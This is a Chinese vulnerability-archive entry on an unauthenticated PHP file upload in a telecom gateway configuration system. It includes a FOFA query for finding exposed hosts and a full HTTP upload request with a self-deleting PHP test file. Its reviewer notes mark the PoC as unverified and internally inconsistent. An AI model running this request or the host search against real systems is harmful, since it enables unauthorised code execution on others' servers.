---
source: "wy876 漏洞文库"
title: "电信网关配置管理系统（开发方未核） teletext material rewrite上传"
product: "电信网关配置管理系统（开发方未核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，PHP解析与材料目录权限"
prerequisites: "请求无Cookie，身份未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frewrite%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"img/dl.gif\" && title=\"系统登录\""
fofa_unverified: "body="
id: "vw-529d5c4773daa0acd1531079"
entity_id: "ve-529d5c4773daa0acd1531079"
schema_version: "1"
---

# 电信网关配置管理系统（开发方未核） teletext material rewrite上传

## 条目说明

- 对象与具体问题：电信网关配置管理系统（开发方未核）；teletext material rewrite上传
- 版本、配置及部署条件：版本未知，PHP解析与材料目录权限
- 认证与权限前提：请求无Cookie，身份未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 简介错写del_file RCE，与rewrite上传标题/请求不符，应删复制错误
- 上传test.php却访问test1.php，缺改名返回说明，不能按此判成功
- echo MD5并自删须GET实际结果，当前只有请求；无修复/版本
- 中国电信公司介绍不能证明软件开发方；HTTP误标Java

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
中国电信集团有限公司（英文名称“China Telecom”、简称“中国电信”）成立于2000年9月，是中国特大型国有通信企业、上海世博会全球合作伙伴。本文请求指向 rewrite 文件上传入口，与 del_file 命令执行不是同一接口。所示写入 PHP 文件后是否能执行，需要后续访问和响应证据。

## 二、影响版本
+ 电信网关配置管理系统

## 三、资产测绘
+ fofa`body="img/dl.gif" && title="系统登录"`
+ 特征


## 四、漏洞复现
```http
POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Connection: close
 
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
 
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
 
 
------WebKitFormBoundaryOKldnDPT--
```


上传文件地址

```http
GET /xmedia/material/test1.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
